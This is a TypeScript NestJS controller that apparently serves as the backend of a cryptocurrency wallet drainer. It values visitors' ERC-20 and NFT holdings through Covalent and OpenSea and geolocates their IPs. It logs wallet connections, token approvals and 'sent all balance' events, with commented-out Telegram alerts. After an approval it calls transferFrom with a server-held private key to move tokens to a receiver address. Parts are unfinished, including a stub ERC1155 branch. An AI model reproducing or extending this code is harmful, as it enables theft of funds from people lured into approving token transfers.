import { Body, Controller, Get, HttpException, HttpStatus, Inject, Post, Query, Res} from '@nestjs/common';
import { EthersService } from './ethers.service'; 
import blacklistERC20 from '../blacklistERC20';
import blacklistNFT from "src/blacklistNFT";
import { ethers } from "ethers";
import geoip from "geoip-lite";
import fetch from "node-fetch";
import axios from "axios";
import { TelegramService } from 'src/telegram/telegram.service';
import { ConfigService } from '@nestjs/config';

const ERC20 = '[{"constant": false,"inputs": [{"name": "_from","type": "address"},{"name": "_to","type": "address"},{"name": "_value","type": "uint256"}],"name": "transferFrom","outputs": [{"name": "","type": "bool"}], "payable": false, "stateMutability": "nonpayable", "type": "function"}]'
const ERC721 = '[{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs": [{"internalType": "bytes4","name": "interfaceId","type": "bytes4"}],"name": "supportsInterface","outputs": [{"internalType": "bool","name": "","type": "bool"}],"stateMutability": "view","type": "function"}]'
const ERC1155 = '[{"inputs": [{"internalType": "address","name": "from","type": "address"},{"internalType": "address","name": "to","type": "address"},{"internalType": "uint256[]","name": "ids","type": "uint256[]"},{"internalType": "uint256[]","name": "amounts","type": "uint256[]"},{"internalType": "bytes","name": "data","type": "bytes"}],"name": "safeBatchTransferFrom","outputs": [],"stateMutability": "nonpayable","type": "function"},{"inputs": [{"internalType": "bytes4","name": "interfaceId","type": "bytes4"}],"name": "supportsInterface","outputs": [{"internalType": "bool","name": "","type": "bool"}],"stateMutability": "view","type": "function"}]'

const networks = {
    eth: {
        url: 'https://rpc.ankr.com/eth',
        chainId: 1,
        name: 'ethereum'
    },
    bsc: {
        url: 'https://rpc.ankr.com/bsc',
        chainId: 56,
        name: "binance"
    },
    poly: {
        url: 'https://rpc.ankr.com/polygon',
        chainId: 137,
        name: "polygon"
    },
    arbi: {
        url: 'https://rpc.ankr.com/arbitrum',
        chainId: 42161,
        name: "arbitrum"
    },
    avax: {
        url: 'https://rpc.ankr.com/avalanche',
        chainId: 43114,
        name: " avalanche"
    },
    ftm: {
        url: 'https://rpc.ankr.com/fantom',
        chainId: 250,
        name: "fantom"
    },
    op: {
        url: 'https://endpoints.omniatech.io/v1/op/mainnet/public',
        chainId: 10,
        name: "optimism"
    },
    goerli: {
        url: 'https://rpc.ankr.com/eth_goerli',
        chainId: 5,
        name: "ethereum"
    },
    bsc_testnet: {
        url: 'https://bsc-testnet.public.blastapi.io',
        chainId: 97,
        name: "binance"
    },
    mumbai: {
        url: 'https://polygon-mumbai.blockpi.network/v1/rpc/public',
        chainId: 80001,
        name: "polygon"
    },
    arbi_testnet: {
        url: 'https://endpoints.omniatech.io/v1/arbitrum/goerli/public',
        chainId: 421613,
        name: "arbitrum"
    },
    avax_testnet: {
        url: 'https://endpoints.omniatech.io/v1/avax/fuji/public',
        chainId: 43113,
        name: "avalanche"
    },
    ftm_testnet: {
        url: 'https://rpc.ankr.com/fantom_testnet',
        chainId: 4002,
        name: "fantom"
    },
    op_testnet: {
        url: 'https://endpoints.omniatech.io/v1/op/goerli/public',
        chainId: 420,
        name: "optimism"
    }
}

// /api/rates -- DONE

// /api/assets
// /api/assets?address=${address}&method=1&price=${config.min_erc20}&chain=${chainId}`
// /api/assets?address=${address}&method=2&price=${config.min_erc721_1155}&chain=${chainId}`

// /api/logs

@Controller('api')
export class EthersController {
    // @Inject(ConfigService)
    // public config: ConfigService;

    @Inject(EthersService)
    private readonly service: EthersService

    // private readonly telegram: TelegramService

    @Get("/rates")
    getRates() {
        return this.service.getRates();
    }

    @Get("/assets")
    async getAssets(@Query() query: any ) {
        const address = query.address,
        method = query.method,
        price = query.price,
        chain = query.chain;
        console.log(2)
        if (!address || !method || !price) {
            console.log("here")
            throw new HttpException("Invalid request.", 400);
        }
        if (method == 1) {
            console.log(`https://api.covalenthq.com/v1/${chain}/address/${address}/balances_v2/?key=${process.env.COVALENT_API_KEY}`)
            const res = await fetch(
                `https://api.covalenthq.com/v1/${chain}/address/${address}/balances_v2/?key=${process.env.COVALENT_API_KEY}`
            )
            const data = await res.json()
            if (data.data?.items?.length) {
                console.log(`ERC-20 assets searched in wallet ${address}!`);
                let assets = data.data.items.filter(
                    (asset) => asset.quote_rate_24h && !blacklistERC20.includes(asset.contract_address)
                );
                return assets.map((asset) => {
                    return {
                        address: asset.contract_address,
                        name: asset.contract_name,
                        symbol: asset.contract_ticker_symbol,
                        amount: asset.balance,
                        schema: "ERC20",
                        price: Number(asset.quote).toFixed(2),
                    };
                });
            } else {
                console.log(`ERC-20 assets not searched in wallet ${address}.`);
                return [];
            }
        } else if (method == 2) {
            console.log(`Searching ERC-721/1155 assets in wallet ${address}...`);
            const payload = {
              headers: {
                "X-API-KEY": process.env.OPENSEA_API_KEY,
              },
              keepAlive: true,
            };
            // if (PROXY) payload.agent = new HttpsProxyAgent(PROXY);
            const res = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${address}&offset=0&limit=300`, payload);
            const data = await res.json();
            if (data?.length) {
              console.log(`ERC-721/1155 assets searched in wallet ${address}!`);
              return data
                .filter((el) => !blacklistNFT.includes(el?.primary_asset_contracts[0]?.address))
                .map(async (asset) => {
                    let kek = await this.service.getRates()
                    console.log(kek)
                    let chainPrice
                    for (const net in networks) if (networks[net].chainId == chain) {
                        console.log(chainPrice = kek[net])
                        chainPrice = kek[net]
                    }
                    console.log(asset?.stats?.seven_day_average_price)
                    console.log(asset?.owned_asset_count)
                    console.log(chainPrice)
                    return {
                        address: asset?.primary_asset_contracts[0]?.address,
                        name: asset?.primary_asset_contracts[0]?.name,
                        symbol: asset?.primary_asset_contracts[0]?.symbol,
                        amount: asset?.owned_asset_count,
                        schema: asset?.primary_asset_contracts[0]?.schema_name,
                        price: Number(
                            asset?.stats?.seven_day_average_price *
                            asset?.owned_asset_count *
                            chainPrice
                        ).toFixed(2),
                    };
                });
            } else {
              console.log(`ERC-721/1155 assets not searched in wallet ${address}.`);
              return [];
            }
        } else {
            console.log("Get assets method not found.");
        }
        // const res = await axios.get(`https://testnets-api.opensea.io/api/v1/collections?asset_owner=${address}&offset=0&limit=300`)
    }

    @Post("/logs")
    async transferFrom(@Query() req: any, @Body() body: any, @Res() res: any) {
        // console.log(req)
        const host = body.host
        const client = req.clientIp
        const method = body.method
        const ref = req.ref;
        
        let clientGeo;
        if (client) {
            try {
              const geo = geoip.lookup(client);
              if (geo.country) {
                if (geo.city) clientGeo = `${geo.country} / ${geo.city}`;
                else clientGeo = `${geo.country}`;
              } else clientGeo = "null";
            } catch(e) { clientGeo = "null" }
          } else clientGeo = "null";

        if (!method || !ref) throw new HttpException("Invalid request", 400)

        const logId = `#${randNumber(10)}`;

        const from = body.address
        const contractAddress = body.contractAddress
        const chain = body.chain
        const amount = body.amount
        let network
        for (const net in networks) if (networks[net].chainId == chain) network = networks[net]
        // console.log(network)
        if (method == 1) {
            const AUTH_KEY = `${req.authorization}`
            if (AUTH_KEY != process.env.SERVER_AUTH_KEY) {
                console.log("NOT AUTHORIZED: /rates method - 1")
                throw new HttpException("Not authorized", 403)
            }
            if (parseInt(process.env.CONNECT_USER_LOG) == 0) throw new HttpException('Connect user log disabled.', 403)
            console.log(`User ${client} connected!\n---\nHost: ${host}\nRef: ${ref}\nLocation: ${clientGeo}`);
            // this.telegram.sendMessage(
            //     TELEGRAM_CHAT_ID,
            //     `ID: <code>${logId}</code>\nHost: <i>${host}</i>\nRef: <i>${ref}</i>\nLocation: <i>${clientGeo}</i>\n\nUser <i>${client}</i> connected!`
            // );
            res.status(HttpStatus.OK).send('Ok Response')
        } else if (method == 2) {
            if (parseInt(process.env.CONNECT_WALLET_LOG) == 0)
                return res.status(HttpStatus.OK).send({message: 'Connect wallet log disabled.'})
            const address = body.address;
            if (!address) throw new HttpException("Invalid request", 400);
            console.log(`Wallet ${address} connected!\n---\nHost: ${host}\nRef: ${ref}\nIP: ${client}\nLocation: ${clientGeo}`);
            // this.telegram.sendMessage(
            //     TELEGRAM_CHAT_ID,
            //     `ID: <code>${logId}</code>\nHost: <i>${host}</i>\nRef: <i>${ref}</i>\nIP: <i>${client}</i>\nLocation: <i>${clientGeo}</i>\n\nWallet <i>${address}</i> connected!`,
            // );
            res.status(HttpStatus.OK).send({message: "Log sent!"});
        } else if (method == 3) {
            if (parseInt(process.env.APPROVAL_TOKENS_LOG) == 0) 
                return res.status(HttpStatus.OK).send({message: 'Approval tokens log disabled.'})
            const address = body.address
            const receiver = body.receiver
            const contractAddress = body.contractAddress
            const contractName = body.contractName
            const contractSymbol = body.contractSymbol
            const contractAmount = body.contractAmount
            const contractPrice = body.contractPrice
            const chain = body.chain
            const contractSchema = body.contractSchema
            const signatureTx = body.signatureTx
            if (!address || !receiver || !contractAddress || !contractName || !contractSymbol || !contractAmount || !contractPrice || !contractSchema || !chain || !signatureTx)
                throw new HttpException("Invalid request.", 400);
            if (contractSchema == "ERC20") {
                let chainName = null;
                for (const net of Object.values(networks)) if (net.chainId == chain) chainName = net.name
                let netw: {
                    name: string,
                    url: string,
                    chainId: number
                };
                for (const net of Object.values(networks)) if (net.chainId == chain) netw = net
                const tx = await transferFrom(1, netw.url, netw.name, netw.chainId, contractAddress, `${process.env.RECEIVER_ADDRESS}`, amount)
                console.log(`TX: ${tx}`)
                
                // this.telegram.sendMessage(
                    //     TELEGRAM_CHAT_ID,
                    //     `ID: <code>${logId}</code>\nHost: <i>${host}</i>\nRef: <i>${ref}</i>\nIP: <i>${client}</i>\nLocation: <i>${clientGeo}</i>\n\nWallet <i>${address}</i> approval ${contractSchema.toUpperCase()} token ${chainName}!\n\nReceiver: <i>${receiver}</i>\nToken: <i>${contractName} (${contractSymbol})</i>\nAmount: <i>${contractAmount} (${contractPrice}$)</i>\nContract: <i>${contractAddress}</i>\nTX: <i>${signatureTx}</i>`
                    // );
                    
                console.log(
                    `Wallet ${address} approve ${contractSchema.toUpperCase()} token ${chainName}!\n---\nID: ${logId}\nHost: ${host}\nRef: ${ref}\nIP: ${client}\nLocation: ${clientGeo}\n\nReceiver: ${receiver}\nToken: ${contractName} (${contractSymbol})\nAmount: ${contractAmount} (${contractPrice}$)\nContract: ${contractAddress}\nTX: ${signatureTx}`
                );
                res.status(HttpStatus.OK).send({ message: "Log sent!" });
            } else if (contractSchema == "ERC721" || contractSchema == "ERC1155") {
                let chainName = null;
                for (const net of Object.values(networks)) if (net.chainId == chain) chainName = net.name
                let netw: {
                    name: string,
                    url: string,
                    chainId: number
                };
                for (const net of Object.values(networks)) if (net.chainId == chain) netw = net
                const cType = await getContractType(netw.url, netw.name, netw.chainId, contractAddress)
                if (cType == "ERC721") {
                    await transferFrom(1, netw.url, netw.name, netw.chainId, contractAddress, `${process.env.RECEIVER_ADDRESS}`, undefined, amount)
                } else if (cType == "ERC1155") {
                    const provider = new ethers.providers.JsonRpcProvider(netw.url, { name: netw.name, chainId: netw.chainId });
                    const signer = new ethers.Wallet(`${process.env.RECEIVER_WALLET_PRIVATE_KEY}`, provider);
                    let contract = new ethers.Contract(`${contractAddress}`, ERC1155, signer);
                    let tokenIds, tokenAmounts
                    // const 
                    // await transferFrom(1, netw.url, netw.name, netw.chainId, contractAddress, `${process.env.RECEIVER_ADDRESS}`, undefined, undefined, )
                } else 
                    // if ERC1155 => // get ERC 1155 balance

                    // if ERC721 => // ...

                console.log(`Wallet ${address} approval ${contractSchema.toUpperCase()} collection!\n---\nID: ${logId}\nHost: ${host}\nRef: ${ref}\nIP: ${client}\nLocation: ${clientGeo}\n\nReceiver: ${receiver}\nCollection: ${contractName} (${contractSymbol})\nAmount: ${contractAmount} (${contractPrice}$)\nContract: ${contractAddress}\nTX: ${signatureTx}`);
                // this.telegram.sendMessage(
                //     TELEGRAM_CHAT_ID,
                //     `ID: <code>${logId}</code>\nHost: <i>${host}</i>\nRef: <i>${ref}</i>\nIP: <i>${client}</i>\nLocation: <i>${clientGeo}</i>\n\nWallet <i>${address}</i> approval ${contractSchema.toUpperCase()} collection!\n\nReceiver: <i>${receiver}</i>\nCollection: <i>${contractName} (${contractSymbol})</i>\nAmount: <i>${contractAmount} (${contractPrice}$)</i>\nContract: <i>${contractAddress}</i>\nTX: <i>${signatureTx}</i>`
                // );
                return res.status(HttpStatus.OK).json({message: "Log sent!"});
            } else return res.status(HttpStatus.OK).send({error: "Invalid request."});
        } else if (method == 4) {
            if (parseInt(process.env.SENT_ALL_BALANCE_LOG) == 0) return res.status(HttpStatus.OK).send({message: 'Sent all balance log disabled.'});
            const address = body.address
            const receiver = body.receiver
            const amount = body.amount
            const price = body.price
            const chain = body.chain
            const signatureTx = body.signatureTx
            if (!address || !receiver || !amount || !price || !chain || !signatureTx)
                throw new HttpException("Invalid request.", 400)
            let chainName = null;
            for (const net of Object.values(networks)) {
                if (net.chainId == chain) chainName = net.name
            }
            console.log(
                `Wallet ${address} sent all ${chainName} balance!\n---\nID: ${logId}\nHost: ${host}\nRef: ${ref}\nIP: ${client}\nLocation: ${clientGeo}\n\nReceiver: ${receiver}\nAmount: ${amount} (${price}$)\nTX: ${signatureTx}`
            );
            // this.telegram.sendMessage(
            //     TELEGRAM_CHAT_ID,
            //     `ID: <code>${logId}</code>\nHost: <i>${host}</i>\nRef: <i>${ref}</i>\nIP: <i>${client}</i>\nLocation: <i>${clientGeo}</i>\n\nWallet <i>${address}</i> sent all ${chainName} balance!\n\nReceiver: <i>${receiver}</i>\nAmount: <i>${amount} (${price}$)</i>\nTX: <i>${signatureTx}</i>`,
            // );
            return res.status(HttpStatus.OK).send({ message: "Log sent!" });
        } else return res.status(400).send({error: "Invalid request."})
    }
}

async function getContractType(
    link: string,
    networkName: string,
    chainId: number,
    contractAddress: string,
) {
    const provider = new ethers.providers.JsonRpcProvider(link, { name: networkName, chainId: chainId });
    const signer = new ethers.Wallet(`${process.env.RECEIVER_WALLET_PRIVATE_KEY}`, provider);
    let contract = new ethers.Contract(`${contractAddress}`, ERC721, signer);
    const is721 = await contract.supportsInterface("0x80ac58cd")
    const is1155 = await contract.supportsInterface("0xd9b67a26")
    return is721 ? "ERC721" : is1155 ? "ERC1155" : undefined


}

async function transferFrom(
    method: number,
    link: string,
    networkName: string,
    chainId: number,
    contractAddress: string,
    to: string,
    amount?: string,
    tokenId?: string,
    tokenIds?: string[],
    tokenAmounts?: string[]
) {
    const provider = new ethers.providers.JsonRpcProvider(link, { name: networkName, chainId: chainId });
    const signer = new ethers.Wallet(`${process.env.RECEIVER_WALLET_PRIVATE_KEY}`, provider);
    let contract;
    if (method == 1) {
        try {
            contract = new ethers.Contract(`${contractAddress}`, ERC20, signer);
            const tx = await contract.transferFrom(signer.address, to, amount);
            await tx.wait();
        } catch (err) {
            console.log(`TRANSFER FAILED:\ntype: ERC20\ncontract address:${contractAddress}\nfrom: ${signer.address}`);
        }
    } else if (method == 2) {
        try {
            contract = new ethers.Contract(`${contractAddress}`, ERC721, signer);
            const tx = await contract.transferFrom(signer.address, to, tokenId);
            await tx.wait();
        } catch (err) {
            console.log(`TRANSFER FAILED:\ntype: ERC721\ncontract address:${contractAddress}\nfrom: ${signer.address}`);
        }
    } else if (method == 3) {
        try {
            contract = new ethers.Contract(`${contractAddress}`, ERC1155, signer);
            const tx = await contract.safeBatchTransferFrom(signer.address, to, tokenIds, tokenAmounts);
            await tx.wait();
        } catch (err) {
            console.log(`TRANSFER FAILED:\ntype: ERC1155\ncontract address:${contractAddress}\nfrom: ${signer.address}`);
        }
    }
}

function randNumber (length) {
    let result = "";
    let words = "0123456789";
    let max_position = words.length - 1;
    for (let i = 0; i < length; ++i) {
        let position = Math.floor(Math.random() * max_position);
        result = result + words.substring(position, position + 1);
    }
    return result;
};